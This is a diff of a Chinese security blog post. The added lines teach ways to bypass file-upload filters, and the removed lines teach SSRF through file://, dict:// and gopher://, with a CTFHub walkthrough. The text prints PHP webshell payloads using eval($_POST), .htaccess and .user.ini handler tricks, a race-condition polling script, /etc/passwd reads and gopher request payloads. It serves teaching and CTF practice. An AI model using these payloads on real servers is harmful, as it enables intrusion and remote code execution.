+<p>表单中使用onsumbit&#x3D;”return checkFile()”调用js函数来检查上传文件的扩展名。当用户在<strong>客户端</strong>选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为<strong>前台脚本检测扩展名</strong>。</p>
+<p><strong>绕过方法</strong>：<br>1、在浏览器中审查元素，删除检测函数<br>2、通过改包软件将修改后缀名再上传<br>3、浏览器安装插件禁用JS<br><br></p>
+<h2 id="后端验证"><a href="#后端验证" class="headerlink" title="后端验证"></a>后端验证</h2><p>在文件被上传到<strong>服务端</strong>的时候，对文件内容、大小和类型进行检测等。</p>
+<h3 id="基于MIME-文件类型检测"><a href="#基于MIME-文件类型检测" class="headerlink" title="基于MIME(文件类型检测)"></a>基于MIME(文件类型检测)</h3><p><strong>常见类型</strong>：<br><img src="/posts/154257042/1.png"></p>
+<p><strong>绕过方法</strong>：<br>使用工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为对应的类型。</p>
+<h3 id="基于后缀"><a href="#基于后缀" class="headerlink" title="基于后缀"></a>基于后缀</h3><p>通过检查文件的扩展名来确定文件<strong>类型</strong>，如果扩展名与允许上传的类型匹配，则系统允许上传；否则，系统可能会拒绝上传或发出警告。</p>
+<p>（虽然一般不会考这么简单，但试试也行）可以尝试改成 <code>php3/4/5/6/7/phps/pht/phpm/phtml</code><br><br></p>
+<h4 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h4><p>文件扩展名在黑名单中的为不合法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_blacklisted</span>(<span class="params">filename</span>):</span><br><span class="line">    blacklisted_extensions = [<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;.bat&#x27;</span>, <span class="string">&#x27;.cmd&#x27;</span>, <span class="string">&#x27;.sh&#x27;</span>]  <span class="comment"># 黑名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含黑名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> blacklisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以黑名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含黑名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_blacklisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型在黑名单中。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<h2 id="常利用的相关协议"><a href="#常利用的相关协议" class="headerlink" title="常利用的相关协议"></a>常利用的相关协议</h2><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// 从文件系统中获取文件内容，如 file:///etc/passwd</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// 常规URL形式</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//字典服务协议，访问字典资源，如 dict:///ip:6767/info:</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//可用于网络端口扫描</span></span><br><span class="line"><span class="symbol">gopher:</span><span class="comment">//分布式文档传递服务</span></span><br></pre></td></tr></table></figure>
+<p><strong>黑名单的绕过方法</strong>在这里简单概括一下，后面会有较为详细的解释。<br><strong>Windows系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、大小写绕过<br>3、双写绕过<br>4、末尾添加.绕过<br>5、末尾添加空格绕过<br>6、末尾添加::$DATA绕过<br>7、截断上传<br>8、竞争上传<br>9、.htaccess文件上传<br>10、上传图片马结合文件包含  </p>
+<p><strong>Linux系统：</strong><br>1、尝试可逆未限制但可以执行的其他脚本后缀<br>2、双写绕过<br>3、截断上传<br>4、竞争上传<br>5、.htaccess文件上传<br>6、上传图片马结合文件包含</p>
+<h4 id="白名单验证"><a href="#白名单验证" class="headerlink" title="白名单验证"></a>白名单验证</h4><p>文件扩展名不在白名单中的均为不合法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_whitelisted</span>(<span class="params">filename</span>):</span><br><span class="line">    whitelisted_extensions = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>]  <span class="comment"># 白名单扩展名列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件名中是否包含白名单扩展名</span></span><br><span class="line">    <span class="keyword">for</span> extension <span class="keyword">in</span> whitelisted_extensions:</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith(extension):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果文件名以白名单扩展名结尾，则返回True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 如果文件名不包含白名单扩展名，则返回False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">filename = <span class="string">&quot;example.jpg&quot;</span></span><br><span class="line"><span class="keyword">if</span> is_whitelisted(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败，文件类型不在白名单中。&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>从文件系统中获取文件内容,格式为file:&#x2F;&#x2F;[文件路径]<br>    file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd            读取文件passwd<br>    file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts               显示当前操作系统网卡的IP<br>    file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp           显示arp缓存表(寻找内网其他主机)<br>    file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib _trie     显示当前网段路由信息</p>
-<h3 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h3><p>作用：常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或资源。</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//example.com</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//example.com/file.php?var1 =val1 &amp;var2=val2</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//user:password@example.com</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//example.com</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//example.com/file.php?var1 =val1 &amp;var2=val2</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//user:password@example.com</span></span><br></pre></td></tr></table></figure>
+<p><strong>白名单的绕过方法</strong>简单概括：<br>1、结合解析漏洞<br>2、截断上传<br>3、文件名长度绕过<br>4、.htaccess文件上传<br>5、上传zip马结合文件包含</p>
+<h4 id="配置文件上传-htaccess-user-ini"><a href="#配置文件上传-htaccess-user-ini" class="headerlink" title="配置文件上传(.htaccess &#x2F; .user.ini)"></a>配置文件上传(.htaccess &#x2F; .user.ini)</h4><p><code>.htaccess：</code><br>.htaccess是Apache Web服务器上的一个配置文件，用于配置服务器的行为，如URL重写、访问控制、重定向等。<br>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>
+<p>但.htaccess文件可用的前提是管理员在http.conf文件中设置 AllowOverried All。<br><img src="/posts/154257042/5.png"></p>
+<p>如果代码没有对htaccess进行过滤，那么可以直接上传.htaccess来设置使用php解析任意文件。<br>创建txt文件输入以下代码，然后改为1.jpg,上传时抓包将filename改回.htaccess即可</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">&quot;\.jpg&quot;</span>为要上传的shell的文件名</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt; </span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;<span class="string">/FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功后再将图片马上传就可以连接蚁剑了</p>
+<p>更多关于.htaccess的操作可以看<br>Y4tacker<br>的<a href="https://blog.csdn.net/solitudi/article/details/116666720%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E8%AF%A6%E7%BB%86%E3%80%82">https://blog.csdn.net/solitudi/article/details/116666720，写的很详细。</a></p>
+<p><strong>局限:</strong><br>.htaccess的配置文件只能在Apache服务器中起作用<br>下面介绍另一个配置文件</p>
+<hr>
 
-<p>协议之间的<strong>区别：</strong><br>    查找内网存活主机IP        file:&#x2F;&#x2F;<br>    查找内网主机开放端口    dict:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;<br>    目录扫描                  http:&#x2F;&#x2F;</p>
-<p>如内网<a href="http://127.0.0.1,通过目录扫描获取网站子页面,使用burp打开代理拦截页面发送至intruder,子页面为http//127.0.0.1/%E6%96%87%E4%BB%B6%E5%90%8D+%E5%90%8E%E7%BC%80%EF%BC%8C%E4%B8%BA%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E5%90%8E%E7%BC%80%E6%B7%BB%E5%8A%A0payload%E5%8F%98%E9%87%8F%E3%80%82">http://127.0.0.1，通过目录扫描获取网站子页面，使用burp打开代理拦截页面发送至intruder，子页面为http://127.0.0.1/文件名+后缀，为文件名和后缀添加payload变量。</a><br>根据数据包大小判断是否有内容页面。可以增加扫描选项如php、zip、txt等。</p>
-<h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>查找内网主机开放端口，获取内网信息，格式为：<code>dict://</code>+<code>ip:端口</code>+<code>/TCP/IP数据</code><br><code>ftp://</code>也可用于网络端口扫描，效率相对较低。</p>
-<p>通过burpsuite抓包，在网址后添加<code>dict://192.168.225.1:80</code><br>在1和80处增加模块，选择集束炸弹，设置payload后进行测试：<br>1、根据Length判断是否返回数据，从而判断端口是否打开<br>2、利用不同的Payload同时扫描多个IP的多个端口</p>
-<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p><code>gopher://</code>是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。gopher协议是ssrf利用最广泛的一个协议 。<br><strong>利用范围：</strong>GET提交、POST提交、redis、fastcgi、SQL</p>
-<p><strong>基本格式：</strong><br><code>gopher://&lt;目标IP&gt;：&lt;端口&gt;/&lt;gopher-path&gt;</code><br>注意gopher协议默认端口为 70，web也需要加端口。</p>
-<p>测试一下，在kali的终端里开启nc监听70端口，然后<code>curl  gopher://127.0.0.l/abcd</code>（不输入端口时，gopher协议默认端口70），发现<strong>gopher请求是不转发第一个字符的</strong>。<br><img src="/posts/1355767420/1.png"></p>
-<p>所以，要保证转发的数据正确，就需要自己在<strong>第一位填充</strong>下划线_或者其他字符：<br><img src="/posts/1355767420/2.png"></p>
-<h4 id="gopher伪协议实现GET提交"><a href="#gopher伪协议实现GET提交" class="headerlink" title="gopher伪协议实现GET提交"></a>gopher伪协议实现GET提交</h4><p>需要保留头部信息：<br>1、路径：GET   &#x2F;name.php?name&#x3D;123   HTTP&#x2F;1.1<br>2、目标地址：Host：172.250.250.4<br><code>gopher://172.250.250.4:80/_GET%20/name.php%3fname=123%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A</code></p>
-<p><font color="red">注意：</font><br>添加端口号80和填充位<br>URL编码：<br>    空格 ：%20<br>    问号 ：%3f<br>    换行符 ： %0d%0A</p>
-<p>1、问号(?)需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0D%0A,但如果直接用工具转，可能只会有%0A<br>3、在HTTP包的最后要加%0D%0A（换行符），代表消息结束(具体可研究HTTP包结束)<br>4、URL编码改为大写,冒号注意英文冒号<br>5、如果使用<strong>BP发包需要进行两次url编码</strong><br>6、GET提交<strong>最后需要增加一个换行符</strong>  </p>
-<h4 id="gopher伪协议实现POST提交"><a href="#gopher伪协议实现POST提交" class="headerlink" title="gopher伪协议实现POST提交"></a>gopher伪协议实现POST提交</h4><p>需要保留头部信息：POST、Host、Content-Type、Content-Length</p>
-<p>将下面保留的内容进行<strong>两次URL编码</strong>：</p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /name.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">172.250</span>.<span class="number">250.4</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">8</span></span><br><span class="line"> </span><br><span class="line">name=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p><code>.user.ini</code><br>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a                  <span class="comment">//绕过exif_imagetype()</span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=<span class="number">1.</span>jpg <span class="comment">//指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span></span><br><span class="line"><span class="built_in">auto</span>_append_file=<span class="number">1.</span>jpg  <span class="comment">//解析后进行包含，它包含在所有php文件执行后执行</span></span><br></pre></td></tr></table></figure>
+<p>假设某网站限制上传php文件，但是可以上传.user.ini，在上传一个图片马，然后可以通过访问含有.user.ini的文件夹下的php文件进行连接蚁剑。</p>
+<h4 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h4><p>首先明确php中00截断的条件：<br>1、php版本小于5.3.29<br>2、magic_quotes_gpc &#x3D; Off  </p>
+<p>无论<strong>0x00</strong>还是**%00<strong>，最终被解析后都是chr（0），而chr（0）返回的就是一个空格，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。那么绕过是怎样发生的呢？<br>如：在通过抓包软件将文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，但是这样只能绕过前端验证，由于后端验证一般是通过文件上传路径来获取文件后缀的，直接截断是没有所以如果要绕过后端验证，则需要满足两个条件之一：<br>1、</strong>文件路径可控<strong>，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads&#x2F;，就可以直接把路径构造成uploads&#x2F;xxx.php%00<br>2、路径拼接直接</strong>使用 $file_name**这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的。</p>
+<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>条件竞争漏洞通常涉及到两个或多个操作：一个是文件的上传操作，另一个是对上传文件进行检查或删除的操作。<br>在某些情况下，这两个操作之间<strong>存在时间差</strong>，即上传操作完成后，检查或删除操作尚未执行。这段时间内，如果攻击者能够利用这个时间差来执行其他操作（如写入恶意脚本或代码），则可能导致严重的安全后果。</p>
+<p>接下来用一个例子进行讲解：</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="language-php"><span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$uploaddir</span>))&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>);</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$allow_ext</span>))&#123;   <span class="comment">//如果文件是jpg或jpeg，那么可以保留并提示上传成功</span></span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);  <span class="comment">//为了实验更好的体现，程序暂停5秒之后才会删除文件</span></span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$uploaddir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">exit</span>(<span class="variable">$uploaddir</span>.<span class="string">&#x27;文件夹不存在，请手工创建&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传漏洞演示--竞争上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>文件上传漏洞演示--竞争上传<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            请选择要上传的文件：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upfile&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看到，文件上传要是不符合要求，那么会在暂停5秒之后删除文件，在这5秒中，我们可以利用这个时间差来执行其他操作。<br>payload：<code>&lt;?php echo md5(1);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&quot;&lt;?php @eval($_POST[cmd])?&gt;&quot;);?&gt;</code></p>
+<p>上传php文件并抓包设置重放（使用null payloads）<br><img src="/posts/154257042/6.png"></p>
+<p>然后使用脚本不断地访问文件上传的地址，脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/upload/uploads/pl6.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:  <span class="comment">#判断shell.php是否写入成功</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><font color="red">注意：</font><br>1、POST后面是要提交的文件名<br>2、Host为目标主机<br>3、类型要和提交的类型一致<br>4、长度为下面提交内容的具体长度<br>5、中间的空行不能少<br>6、<strong>回车换行要变为%0D%0A</strong>,但如果直接用工具转，可能只会有%0A  </p>
-<p>无论是GET提交还是POST提交，gopher的格式是不变的：<br><code>gopher://172.250.250.4:80/_编码后的内容粘贴至此</code><br><br></p>
-<h4 id="CTFHub技能树："><a href="#CTFHub技能树：" class="headerlink" title="CTFHub技能树："></a>CTFHub技能树：</h4><p>1、输入<code>?url=file:///var/www/html/flag.php</code>得到以下代码</p>
-<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span></span><span class="language-xml"><span class="comment">--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>等到脚本返回200状态码则说明pl6.php执行成功并生成了shell.php，接下来使用蚁剑或者菜刀连接既可。<br><img src="/posts/154257042/7.png"></p>
+<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>文件上传二次渲染漏洞是指在文件上传功能中，服务器对上传的图片进行了<strong>二次处理</strong>（如格式、尺寸等），并且在处理完成后，将生成的新图片放置到网站对应的标签上显示。</p>
+<p>绕过方式分为三种：<strong>GIF绕过、PNG绕过、JPG绕过</strong>  </p>
+<p>1、GIF绕过二次渲染的方法，就是通过对比上传前和上传后的两个文件，如果说哪个位置，它的上传前和上传后的没有变，我们就把php一句话代码插入到这个位置。</p>
+<h4 id="结合解析漏洞（待补）"><a href="#结合解析漏洞（待补）" class="headerlink" title="结合解析漏洞（待补）"></a>结合解析漏洞（待补）</h4><h4 id="上传zip马结合文件包含"><a href="#上传zip马结合文件包含" class="headerlink" title="上传zip马结合文件包含"></a>上传zip马结合文件包含</h4><p>在白名单内只允许上传zip文件时，可以将php文件放入zip内，注意压缩方式为<strong>存储</strong>。<br><img src="/posts/154257042/3.png"></p>
+<p>在上传zip文件后，使用文件包含伪协议进行运行<br>zip:&#x2F;&#x2F; （压缩流）<br>phar:&#x2F;&#x2F; （PHP归档)<br>    <a href="http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo">http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo</a><br>    <a href="http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo">http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo</a><br>其中phpinfo.zip是所上传的压缩包，phpinfo是压缩包内的文件名，如果源代码中没有include <strong>php</strong>后缀的话，需要在伪协议代码后自行添加.php<br>如果include 的是jpg后缀，那么将压缩包内的文件也对应改成jpg即可<br><img src="/posts/154257042/4.png"></p>
+<h4 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h4><p><strong>1、上传图片马结合文件包含</strong><br>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。<br>假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;1.jpg,图片代码如下：<br><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[&#39;password&#39;]);?&gt;&quot;)?&gt;</code><br>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/1.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</p>
+<p><strong>2、大写绕过</strong>  </p>
+<p><strong>3、空格绕过</strong></p>
+<p><strong>4、后缀加.</strong></p>
+<p><strong>5、::$DATA绕过</strong></p>
+<p><strong>6、.空格.绕过</strong></p>
+<p><strong>7、双写后缀绕过</strong></p>
+<p><strong>8、字节标识绕过</strong></p>
+<p><strong>9、数组后缀绕过</strong></p>
+<br>
 
-<p>2、输入<code>?url=127.0.0.1/flag.php</code><br>回显：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=1766811aa32af96837a1e79f776bfbd6--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现key的值</p>
-<p>3、那我们可以构造payload为：</p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /flag.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">36</span></span><br><span class="line"></span><br><span class="line">key=1766811aa32af96837a1e79f776bfbd6</span><br></pre></td></tr></table></figure>
